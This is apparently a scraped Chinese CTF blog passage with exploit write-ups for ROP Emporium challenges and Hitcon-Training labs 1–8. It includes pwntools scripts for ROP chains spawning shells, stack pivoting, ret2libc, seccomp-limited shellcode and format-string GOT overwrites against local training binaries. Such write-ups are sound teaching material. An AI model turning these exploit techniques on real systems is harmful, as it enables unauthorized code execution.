ret0x0000000000400b3b : pop r12 ; pop r13 ; ret0x0000000000400bae : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3d : pop r13 ; ret0x0000000000400b40 : pop r14 ; pop r15 ; ret0x0000000000400b42 : pop r15 ; ret0x0000000000400852 : pop rbp ; mov byte ptr [rip + 0x20084e], 1 ; ret0x0000000000400bab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400baf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400b39 : pop rdi ; ret0x0000000000400b41 : pop rsi ; pop r15 ; ret0x0000000000400bad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3c : pop rsp ; pop r13 ; ret0x00000000004006b1 : ret0x0000000000400aad : ret 0x10750x0000000000400b30 : xor byte ptr [r15], r14b ; ret0x0000000000400b31 : xor byte ptr [rdi], dh ; retUnique gadgets found: 24 64位程序就可以一次传进去exp:12345678910111213141516171819202122232425262728293031# -*- coding:UTF-8 -*-from pwn import *sh = process('./badchars')binsh = "/bin/sh\x00"xorbinsh = ""#加密for i in binsh: xorbinsh += chr(ord(i) ^ 2)bss_addr = 0x0000000000601080system_plt = 0x00000000004006F0mov_r13_r12_ret = 0x0000000000400b34pop_r12_r13_ret = 0x0000000000400b3bxor_r15_r14_ret = 0x0000000000400b30pop_r14_r15_ret = 0x0000000000400b40pop_rdi_ret = 0x0000000000400b39payload = ""payload += 0x28 * "A"#一次传入payload += p64(pop_r12_r13_ret)payload += xorbinshpayload += p64(bss_addr)payload += p64(mov_r13_r12_ret)#解密 for i in range(0,len(xorbinsh)): payload += p64(pop_r14_r15_ret) payload += p64(2) + p64(bss_addr + i) payload += p64(xor_r15_r14_ret)payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(system_plt)sh.sendline(payload)sh.interactive() fluff题目的设置跟前面的题还是一样没什么变化，查一波gadget，会发现在这次的写入没之前的那么顺利12345678910111213141516171819202122232425262728293031$ ROPgadget --binary ./fluff32 --only &quot;mov|pop|ret|xor|xchg&quot;Gadgets information============================================================0x08048547 : mov al, byte ptr [0xc9010804] ; ret0x08048709 : mov dword ptr [0x81fffffd], eax ; ret0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x08048674 : mov ebp, 0xcafebabe ; ret0x080484b0 : mov ebx, dword ptr [esp] ; ret0x0804867e : mov edi, 0xdeadbabe ; ret0x0804868c : mov edx, 0xdefaced0 ; ret0x0804867d : pop ebp ; mov edi, 0xdeadbabe ; ret0x0804868b : pop ebp ; mov edx, 0xdefaced0 ; ret0x08048695 : pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x080486fb : pop ebp ; ret0x080486f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080483e1 : pop ebx ; ret0x08048696 : pop ebx ; xor byte ptr [ecx], bl ; ret0x08048692 : pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x080486fa : pop edi ; pop ebp ; ret0x08048670 : pop edi ; xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret0x08048673 : pop esi ; mov ebp, 0xcafebabe ; ret0x080486f9 : pop esi ; pop edi ; pop ebp ; ret0x0804867a : pop esi ; xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret0x080483ca : ret0x080484fe : ret 0xeac10x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret0x08048697 : xor byte ptr [ecx], bl ; ret0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retUnique gadgets found: 26 因为没有mov可以直接写入，这里我们可以用xor进行写入操作，用一个xor操作清空寄存器A，再通过 xor A,B就可以将B寄存器的内容写入到寄存器A中去。这道题就是巧秒得利用了xor来进行写入。exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -*- coding:UTF-8 -*-from pwn import *context.log_level = "debug"sh = process('./fluff32')binsh = "/bin/sh\x00"system_plt = 0x08048430data_addr = 0x0804A028#mov_ecx_edx;pop_ebp;pop_ebx;xor_ecx_bl;retgadget1 = 0x08048693#xor_edx_edx;pop_esi;mov_ebp_0xcafebabe;ret 亦或自身gadget2 = 0x08048671#xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retgadget3 = 0x0804867bpop_ebx = 0x080483e1#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retgadget4 = 0x08048689junk = "A" * 4payload = ""payload += 0x28 * "A" + junkpayload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(pop_ebx) + p32(data_addr)payload += p32(gadget3) + p32(0) #(edx = data_addr,pop_ebp,mov)payload += p32(gadget4) + p32(0) #ecx = data_addrpayload += p32(pop_ebx) payload += "/bin"payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = "/bin",pop_ebp,mov)#"/bin"放到data中去payload += p32(gadget1) + p32(0) + p32(0)payload += p32(pop_ebx) + p32(data_addr + 4)payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = data_addr,pop_ebp,mov)payload += p32(gadget4) + p32(0) #ecx = data_addr + 4payload += p32(pop_ebx) payload += "/sh\x00"payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = "/bin",pop_ebp,mov)#"xsh\x00"放到data中去payload += p32(gadget1) + p32(0) + p32(0)payload += p32(system_plt) + p32(0) + p32(data_addr)sh.sendline(payload)sh.interactive() 64位程序 ：这里需要注意一下在查gadget的时候，可能会出现找不到想要的gadget，可以加上参数 –depth 20，（20是深度最深的情况了）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152$ ROPgadget --binary fluff --only &quot;mov|pop|ret|xor|xchg&quot; --depth 20Gadgets information============================================================0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret0x000000000040084f : mov dword ptr [rdx], ebx ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004007ae : mov eax, 0 ; pop rbp ; ret0x0000000000400835 : mov ebp, 0x604060 ; ret0x0000000000400846 : mov ebx, 0x602050 ; ret0x0000000000400827 : mov edi, 0x601050 ; ret0x000000000040083b : mov edi, 0x601050 ; xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400845 : mov r11d, 0x602050 ; ret0x0000000000400834 : mov r13d, 0x604060 ; ret0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400853 : pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400851 : pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400825 : pop r14 ; mov edi, 0x601050 ; ret0x00000000004008c0 : pop r14 ; pop r15 ; ret0x000000000040082d : pop r14 ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400843 : pop r15 ; mov r11d, 0x602050 ; ret0x00000000004008c2 : pop r15 ; ret0x0000000000400820 : pop r15 ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400852 : pop rbp ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004008bf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x00000000004008ba : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400844 : pop rdi ; mov r11d, 0x602050 ; ret0x00000000004008c3 : pop rdi ; ret0x0000000000400821 : pop rdi ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400826 : pop rsi ; mov edi, 0x601050 ; ret0x00000000004008c1 : pop rsi ; pop r15 ; ret0x000000000040082e : pop rsi ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret0x0000000000400833 : pop rsp ; mov r13d, 0x604060 ; ret0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400854 : pop rsp ; xor byte ptr [r10], r12b ; ret0x00000000004005b9 : ret0x0000000000400841 : xchg ebx, edx ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400855 : xor byte ptr [r10], r12b ; ret0x0000000000400856 : xor byte ptr [rdx], ah ; ret0x0000000000400823 : xor ebx, ebx ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400830 : xor ebx, esp ; pop r12 ; mov r13d, 0x604060 ; ret0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retUnique gadgets found: 47 exp:1234567891011121314151617181920212223242526272829303132333435363738from pwn import *sh = process('./fluff')binsh = "/bin/sh\x00"system_plt = 0x00000000004005E0data_addr = 0x0000000000601050pop_rdi = 0x00000000004008c3#mov r10, r11 ; pop r13 ; pop r12 ; xor r10, r12 ; retgadget1 = 0x000000000040084e#pop r15 ; mov r10, r11 ; pop r13 ; pop r12 ; xor r10, r12 ; retgadget2 = 0x000000000040084c#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retgadget3 = 0x0000000000400822#xor r11, r12 ; pop r12 ; mov r13, 0x604060 ; retgadget4 = 0x000000000040082f#xchg r11, r10 ; pop r15 ; mov r11, 0x602050 ; retgadget5 = 0x0000000000400840#pop r12 ; pop r13 ; pop r14 ; pop r15 ; retgadget6 = 0x00000000004008bcpayload = ""payload += 0x20 * "A" + p64(0)#将 data_addr 写入r10payload += p64(gadget6) + p64(data_addr) +p64(3) + p64(4) + p64(5)payload += p64(gadget3) + p64(4)payload += p64(gadget4) + binshpayload += p64(gadget5) + p64(5)#将"/bin/sh\x00" 写入r11payload += p64(gadget6) + binsh +p64(3) + p64(4) + p64(5)payload += p64(gadget3) + p64(4)payload += p64(gadget4) + binsh#data_addr = "/bin/sh\x00"payload += p64(gadget1) + p64(3) + p64(0)payload += p64(pop_rdi) + p64(data_addr) + p64(system_plt)sh.sendline(payload)sh.interactive() pivot这道题有两次输入，第一次输入到堆中，第二次输入到栈中，而且很明显第二次的可溢出大小不够用来构造rop链，所以我们需要将rop链构造在堆中，然后利用栈迁移来执行rop链。题目中也将堆的地址打印了出来 ，降低了不少难度。给出的.so文件有这个函数可以用： 12345void __noreturn ret2win()&#123; system("/bin/cat flag.txt"); exit(0);&#125; 显然我们构造的rop链要能够控制程序跳转到这个函数去执行，这里需要用到计算偏移elf函数中只有foothold_function在.so中也出现，而且也在got表中，所以ret2win的真实地址可以结合foothold_function算出来，这里需要注意的是，需要先将foothold_function函数调用一次，got表中才有foothold_function的真实地址。这里说一下我踩过的坑，偏移有两种算法：1、真实地址-libc地址2、两个licb函数地址相减一开始我用第一种方法算偏移，理论上来说两种方法都没错，但是因为函数需要调用一次后才能在got表中有真实地址，所以直接拿got表中的地址来当真实地址的错的，所以最好使用第二种方法算偏移，然后在构造rop的时候将其中的一个地址调用一次使得got表中有它的真实地址再拿去加偏移就能得到目标函数的真实地址。exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *sh = process('./pivot32')elf = ELF('./pivot32')libc = ELF('./libpivot32.so')foothold_plt = elf.plt['foothold_function']foothold_got_plt = elf.got['foothold_function']foothold_sym = libc.symbols['foothold_function']ret2win = libc.symbols['ret2win']# offset = int(foothold_got_plt - foothold_sym) 这里就是直接用got表的地址去算偏移，其实是错的，因为foothold_function函数没有调用过，got表中并不是真实地址# offset = int(ret2win - foothold_sym)offset = ret2win - foothold_sym#offset = foothold_sym - ret2win 这里算偏移的时候要注意结果不能为负数 sh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")leakaddr = int(sh.recv(10),16) #接收题目打印出来的堆地址print hex(leakaddr) pause()add_eax_ebx = 0x080488c7mov_eax_eax = 0x080488c4pop_eax = 0x080488c0pop_ebx = 0x08048571call_eax = 0x080486a3leave_ret = 0x080486a8payload_1 = ""payload_1 += p32(foothold_plt) #将foothold_function函数调用一次payload_1 += p32(pop_eax)payload_1 += p32(foothold_got_plt) #上面调用了一次这里就是真实地址了payload_1 += p32(mov_eax_eax)payload_1 += p32(pop_ebx)payload_1 += p32(offset)payload_1 += p32(add_eax_ebx)payload_1 += p32(call_eax)sh.sendline(payload_1)payload_2 = ""payload_2 += 0x28 * "A"payload_2 += p32(leakaddr-4) + p32(leave_ret)sh.sendline(payload_2)sh.interactive() 64位exp:1234567891011121314151617181920212223242526272829303132333435363738from pwn import *sh = process('./pivot')elf = ELF('./pivot')so = ELF('./libpivot.so')foothold_plt = elf.plt['foothold_function']foothold_got_plt = elf.got['foothold_function']footold_sym = so.symbols['foothold_function']ret2win_sym = so.symbols['ret2win']offset = ret2win_sym - footold_symsh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")addr = int(sh.recv(14),16)print hex(addr)pause()mov_rax_rax = 0x0000000000400b05 add_rax_rbp = 0x0000000000400b09pop_rax = 0x0000000000400b00pop_rbp = 0x0000000000400900pop_rdi = 0x0000000000400b73call_rax = 0x000000000040098e# pop_rsp_r13_r14_r15_ret = 0x0000000000400b6dxchg_rax_rsp = 0x0000000000400b02sh.recvuntil("&gt; ")payload_1 = ""payload_1 += p64(foothold_plt)payload_1 += p64(pop_rax) + p64(foothold_got_plt)payload_1 += p64(mov_rax_rax)payload_1 += p64(pop_rbp) + p64(offset)payload_1 += p64(add_rax_rbp)payload_1 += p64(call_rax)sh.sendline(payload_1)sh.recvuntil("&gt; ")payload_2 = ""payload_2 += 0x28*"A"payload_2 += p64(pop_rax) + p64(addr) + p64(xchg_rax_rsp)# payload_2 += p64(pop_rsp_r13_r14_r15_ret) + p64(addr) + p64(3) + p64(4) + p64(5)sh.sendline(payload_2)sh.interactive() ret2csu先checksec一波，no canry ,no pie 从IDA可以看到程序存在栈溢出漏洞和一个后门函数 但是这个后门函数需要三个参数，a1,a2随意，a3需要为0xdeadcafebabebeef,找一下gadget 并没有如pop rdx , mov rdx的gadget，这个时候，我们可以利用__libc_csu_init中的gadget 可以控制 r15,r14,r13的值 来达到控制 rdx,rsi,rdi的目的，这里因为有一个坑，setvbuf函数在调用的时候会将rdx赋值为0xffffffff,这样的话就不能成功调用ret2win了，所以找一个初始化函数调用一下exp: 12345678910111213141516171819202122232425262728#-*-coding:utf-8-*-from pwn import *p = process('./ret2csu')context.log_level = 'debug'init = 0x600E10 #初始化函数地址rop_1 = 0x400880rop_2 = 0x40089aret2win = 0x4007B1payload = 0x20*'a'payload += p64(0) #rbppayload += p64(rop_2)payload += p64(0) #rbxpayload += p64(1) #rbppayload += p64(init) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0xdeadcafebabebeef) #r15payload += p64(rop_1)payload += p64(0) #add rsp,8可以理解为pop操作，但是没有pop到寄存器，而有丢弃掉payload += p64(0) #rbxpayload += p64(0) #rbppayload += p64(0) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0) #r15payload += p64(ret2win)p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hitcon-Training lab1~lab9]]></title>
    <url>%2F2019%2F04%2F04%2FHitcon-Training(%E4%B8%8A)%2F</url>
    <content type="text"><![CDATA[lab1方法1：逆向破解，因为题目给了.c文件，里面有key和cipher可以直接用123456key = "Do_you_know_why_my_teammate_Orange_is_so_angry???"cipher = [7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66]flag = ""for i in range(len(cipher)): flag += chr(cipher[i]^ord(key[i]))print flag 方法2：利用gdb动态调试，可以在已生成password且未输入magic的情况下获得password的值：12345678910111213在0x80486e7处下断点，可以看到ebp - 0x80就是password存放的地方► 0x80486e7 &lt;get_flag+332&gt; lea eax, [ebp - 0x80] 0x80486ea &lt;get_flag+335&gt; push eax 0x80486eb &lt;get_flag+336&gt; push dword ptr [ebp - 0x74] 0x80486ee &lt;get_flag+339&gt; call read@plt &lt;0x8048410&gt;再运行到0x8048712处，可以查看 ebp - 0x80的值 pwndbg&gt; x/wx ($ebp -0x80)0xffffcd08: 0x4f77e43c转成十进制，输入就能得到flagpwndbg&gt; cContinuing.1333257276 CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;[Inferior 1 (process 7593) exited normally] 方法3：同样利用gdb调试，但是这次不用获取password的值而直接在if跳转前设置eip的值指向flag输出的for 循环即可 lab2checksec 一波，只开了 canary 到IDA里看一波，程序逻辑很简单，就是让你输入一个shellcode然后执行它，但是这里需要注意orw_seccomp函数，里面有个prctl会限制部分syscall的调用，只能通过open ,read , write 到获得flag，不是很懂prctl的第一个参数的数值代表什么，就估且当做是第n个的代号吧,往下数到第22个 既然只能读写，那就不能用system(/bin/cat flag)去获取flag，这里我们需要自己写shellcode：123fp = open("flag",0)read(fp,buf,0x30)write(1,buf,0x30) 首先我们要查到open,read,write三个函数对应的系统调用号和参数应该调入的寄存器：linux syscall 接下来写shellcode：123456789101112131415161718192021fp = open(&quot;flag&quot;,0)push 0 0截断：这个0是必需的，这样才能截断字符串的读取push 0x67616c66 &quot;flag&quot;mov ebx,esp open的第一个参数 &quot;flag&quot;xor ecx,ecx 将ecx清0，做为open的第二个参数mov eax,0x5 open的系统调用号int 0x80 中断，进入系统调用read(fp,buf,0x30) mov ebx,eax 系统调用结束 ，将返回值存入eax，（open的返回值为fp,而fp为read的第一个参数）将ebx赋值为fp，做为read的第一个参数mov ecx,esp 将栈顶传给ecx做为read的第二个参数mov edx,0x30 read的第三个参数0x30xor eax,eax 清空eaxmov eax,0x3 read的系统调用号int 0x80 中断，进入系统调用write(1,buf,0x30)（因为write的第二个参数跟read的一样，所以这里可以不用再传一次）mov ebx,1 write的第1个参数mov edx,0x30 write的第三个参数mov eax,0x4 write的系统调用号int 0x80 中断，进入系统 调用 因为自己踩过坑，这里补充一下0截断，也就是在push “flag”之前 为什么要push 0：字符串在读取的时候总是以\x00作为结束标志，如果不先push 0，那么它会将后面的东西也当做字符串读取进来，这样会导致系统读到的文件名不是”flag”，而是”flag…..”后面还有东西，这样就会找不到flag，这里read的返回值就为-1。 这样，shellcode就写完了，exp如下 ：12345678910111213141516171819202122232425262728293031from pwn import *p = process('./orw.bin')shellcode = '''push 0push 0x67616c66mov ebx,espxor ecx,ecxmov eax,0x5int 0x80mov ebx,eaxmov ecx,espmov edx,0x30xor eax,eaxmov eax,0x3int 0x80mov ebx,1mov edx,0x30mov eax,0x4int 0x80'''print asm(shellcode)pause()p.recvuntil(":")gdb.attach(p,"b *0x08048582")pause()p.sendline(asm(shellcode))pause()p.interactive() lab3这一题很简单，第一次输入写进了bss段，第二次输入用gets函数，所以我们只需要在第一次输入的时候输入shellcode，第二次输入将返回地址覆盖成bss段的地址就行，需要注意的是,s的偏移并不是0x14，而是0x1c，如果 IDA 看不出来可以在gdb下信断点查看 exp:1234567891011from pwn import *p = process('./ret2sc')shellcode_addr = 0x0804A060shellcode = asm(shellcraft.sh())p.recvuntil(":")p.sendline(shellcode)p.recvuntil(":")payload = "A" * 0x1c + p32(0) + p32(shellcode_addr)p.sendline(payload)p.interactive() lab4两次输入，第一次输入一个地址，然后程序打印出地址的内容，这可以想到将puts_got地址输入就可以拿到puts函数的真实，先checksec一波 一道简单的ret2libc，那么接下来思路很简单，第一次输入给puts_got地址，拿到puts函数的真实地址，再得到puts函数的libc地址就可以算出偏移，之后 就可以为所欲为的得到其它函数的真实地址了；先找一下库文件： 接下来解决两个小问题：1、查找 字符串”\bin\sh”2、爆出第二次输入的偏移字符串的查找可以用pwntoolsbinsh_libc = libc.search(&#39;/bin/sh&#39;).next()偏移的获得用cyclic 参数生成一串字符之后 ，在gdb中输入得到一个地址，再用cyclic -l 地址即可得到到ret的偏移： exp:1234567891011121314151617181920212223242526272829303132# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./ret2lib')elf = ELF('./ret2lib')libc = ELF('/lib/i386-linux-gnu/libc.so.6')puts_got = elf.got['puts']print str(puts_got) #134520860pause()p.sendline(str(puts_got))p.recvuntil(": ")puts_addr = int(p.recv(10),16)print "puts_addr:" + hex(puts_addr)puts_libc = libc.symbols['puts']print "puts_libc:" + hex(puts_libc)system_libc = libc.symbols['system']print "system_libc:" + hex(system_libc)binsh_libc = libc.search('/bin/sh').next() 查找 "/bin/sh" 的地址print "binsh_libc:" + hex(binsh_libc)offset = puts_addr - puts_libc #偏移system_addr = offset + system_libcbinsh_addr = offset + binsh_libc# main = 0x804857Dret= 0xdeadbeef #返回地址随意payload = "A" * 60payload += p32(system_addr) + p32(ret) + p32(binsh_addr)# payload += p32(system_addr) + 'b' * 4 + p32(binsh_addr)# gdb.attach(p,"b *0x0804862F")# pause()p.sendline(payload)p.interactive() lab5先checksec 一波 开启了NX保护，静态链接，溢出的空间也够构造rop链，一看就是return to syscall，但是没有发现system函数，也没有”/bin/sh”，这就需要我们自己写execve(“/bin/sh”)了我的思路是这样：将”/bin/sh”构造在bss段作为execve的参数，然后进入系统调用execve；那么我们先要找到一个可以写到内存的gadget：0x0807b301 : mov dword ptr [eax], edx ; ret,bss段的写入就跟之前的没什么两样，找到gadget：1230x080bae06 : pop eax ; ret0x0806e82a : pop edx ; ret0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret 这里还需要找到 int 0x80 : int 0x80```系统中断调用123456789101112131415161718192021222324252627282930313233343536这里还需要查一下sys_execve函数的系统调用号和参数对应的寄存器：![image.png](https://upload-images.jianshu.io/upload_images/12343640-872bc99fa961056a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)接下来就开始构造rop了：exp:```python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./simplerop&apos;)elf = ELF(&apos;./simplerop&apos;)bss = 0x080EAF80binsh = &quot;/bin/sh\x00&quot;mov_ineax = 0x0807b301# mov_eax_ecx = 0x080a7a6apop_edx_ecx_ebx = 0x0806e850pop_eax = 0x080bae06pop_ebx = 0x080481c9pop_edx = 0x0806e82aint0x80 = 0x080493e1payload = &quot;A&quot; * 32 #将&quot;/bin/sh\x00&quot;分两次写入bss段payload += p32(pop_eax) + p32(bss)payload += p32(pop_edx) + binsh[0:4]payload += p32(mov_ineax)payload += p32(pop_eax) + p32(bss + 4)payload += p32(pop_edx) + binsh[4:8]payload += p32(mov_ineax)#构造 execve(&quot;/bin/sh\x00&quot;)函数并调用 payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss)payload += p32(pop_eax) + p32(0x0b)#中断 ，进入系统调用 payload += p32(int0x80)p.sendline(payload)p.interactive() lab6从IDA我们可以看到，main函数只能调一次，那么就用不了ret2libc了，接下来算出溢出的空间只有20个字节（这里96是被我改过的，原题大小是0x40) checksec： 溢出的空间是不够用来构造rop链的，那么就要用到栈迁移了，思路是：先利用溢出执行一次read函数，把我们接下来要执行的rop链写到bss段去，利用leave将ebp跳转到bss段上去，让程序 当成栈去执行，从而达到栈迁移的目的找到对应的gadget就可以开始写exp了exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#-*- coding:utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./migration')elf = ELF('./migration')# libc = ELF('/lib/i386-linux-gnu/libc.so.6')libc = elf.libcsystem_libc = libc.symbols['system']print "system_libc :" + hex(system_libc)puts_plt = elf.plt['puts']print "puts_plt :" + hex(puts_plt)puts_got = elf.got['puts']print "puts_got :" + hex(puts_got)puts_libc = libc.symbols['puts']print "puts_libc :" + hex(puts_libc)read_plt = elf.plt['read']print "read_plt :" + hex(read_plt)binsh = libc.search("/bin/sh").next()print "binsh :" + hex(binsh)leave_ret = 0x08048418buf1 = elf.bss() + 0x500buf2 = elf.bss() + 0x400# pop_ebp = 0x0804856bpop_ebx = 0x0804836d#调用 read 函数往 buf1 写入"/bin/sh"（不明白的一点，为什么第一个参数是0,第一个参数不该是指向"/bin/sh"的一个指针吗？）#read的第一个参数为0指的是标准输入流也就是键盘，在脚本里面的键盘就是payload,也就是下一个senndline(payload)就是读入的内容 payload = "A" * 40payload += p32(buf1) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf1) + p32(0x100)p.recvuntil(" :\n")# gdb.attach(p)pause()p.send(payload)# pause()#打印出puts的真实地址 ，然后继续调用 read 函数payload = p32(buf2) + p32(puts_plt) + p32(pop_ebx) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf2) + p32(0x100)p.send(payload)# pause()#接收打印的puts真实地址 puts_addr = u32(p.recv(4))print "puts_addr :" + hex(puts_addr)#算偏移offset = puts_addr - puts_libcsystem_addr = offset + system_libcbinsh_addr = offset + binshpayload = p32(0) + p32(system_addr) + "bbbb" + p32(binsh_addr)p.send(payload)p.interactive()# 0xf7df9ca0 这里盗来23R3F师傅的一张图来理解栈迁移的过程 lab7先checksec一波，canary开了，不能愉快地栈溢出了 这道题的意思很清楚，password是一个随机数，只要在第二次输入的时候相等那就可以cat 到 flag ，那么我们需要在第二次输入之前就知道password的值，这里我自然而然地想到了用gdb下断查看 password 的值，这种做法虽然在本地可以但是一但远程了就没鸟用；这就用到了格式化字符串首先，我们要泄漏出password的值 ，要先得到格式化字符串的地址在哪，输入一串东西&quot;“AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p........ %p泄漏出了printf栈里面的东西，找到AAAA的位置，在第十个，也就是说，格式化字符串的栈的第十个位置，接下来我们就可以构造 [地址] + %10$s将password 泄漏出来，然后接下来就简单了。exp:12345678910111213141516171819202122#-*- coding:utf-8 -*-from pwn import *p = process('./crack')#输入"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...."可以爆出格化字符串的偏移为10password = 0x804A048# print p32(password)# pause()payload = p32(password) + "#" + "%10$s" + "#" #输入两个#用作标记p.recvuntil("What your name ? ")p.send(payload)p.recvuntil("#") #当接收到第一个#时开始返回password的内容了，接收r = p.recvuntil("#") #接收到 # 结束# print rprint len(r)pause()print u32(r[:4]) #因为第二个#会被接收，所以要去掉a = u32(r[:4])# print str(a)# pause()p.recvuntil("Your password :")p.send(str(a))p.interactive() lab8拿到题目，先checksec一波 开了canary，跟栈溢出没关系了，放到IDA里很明显可以看到我们只需要修改magic的值为218或者0xFACEB00C就行了，再看这一句printf(&amp;buf);很明显是格式化字符串了。先测试格式化字符串的位置： 偏移为7，接下来修改magic为2181234567891011121314#-*- coding:utf-8 -*-#偏移为7from pwn import *context.log_level = 'debug'p = process('./craxme')#改小magic = 0x0804A038payload = ""payload += p32(magic) + "%0214c" + "%7$n" #218-4 = 214，前面有个地址4位，所以只需再填214个字符payload2 = fmtstr_payload(7,&#123;magic:218&#125;)p.sendline(payload)p.recv()p.interactive() 修改magic为0xFACEB00C12345678910111213141516171819202122232425262728#-*- coding:utf-8 -*-#偏移为7from pwn import *context.log_level = 'debug'p = process('./craxme')magic = 0x0804A038padding1 = 0x10c-16 #因为0c-16&lt;0所以要在前面加一位(这个加了一位1),这样才能将0c读进去padding2 = 0x1b0 - 0x10cpadding3 = 0x1ce - 0x1b0padding4 = 0x1fa - 0x1ceprint padding1print padding2print padding3print padding4pause()payload = ""payload += p32(magic) + p32(magic+1) + p32(magic+2) + p32(magic+3)# payload += padding1*'a' + "%7$n" + padding2*'b' + "%8$n" + padding3*'c' + "%9$n" + padding4*'d' + "%10$n"payload += "%252c%7$hhn" #padding1 252+16 = 10c(以下同理)payload += "%164c%8$hhn" #padding2payload += "%30c%9$hhn" #padding3payload += "%44c%10$hhn" #padding4# payload2 = fmtstr_payload(7,&#123;magic:0xFACEB00C&#125;) #也可以直接调用fmtstr_payload这个函数p.sendline(payload2)# p.sendline(payload)p.recv()p.interactive() 搜索大佬的博客发现还有另外 两种做法：1、修改puts的got表为system(&quot;cat /home/craxme/flag&quot;);的地址，这样到执行puts(&quot;You need be a phd&quot;);时就会直接执行system(&quot;cat /home/craxme/flag&quot;);2、修改puts的got表为read(0, &amp;buf, 0x100u);把printf 的got表改为system的plt表地址，这样就能拿到shell了（我只能说骚啊）1、修改puts的got表为system(&quot;cat /home/craxme/flag&quot;);的地址 12345678910111213#-*-coding:utf-8-*-from pwn import *p = process('./craxme')elf = ELF('./craxme')#将put_got修改为read(0,&amp;buf,0x100)#将printf修改为systemputs_got = elf.got['puts']system_catflag = 0x80485F3#read(0,&amp;buf,0x100)read = 0x80485A1payload = fmtstr_payload(7,&#123;puts_got:system_catflag&#125;)p.sendline(payload)p.interactive() 2、get shell123456789101112131415#-*-coding:utf-8-*-from pwn import *p = 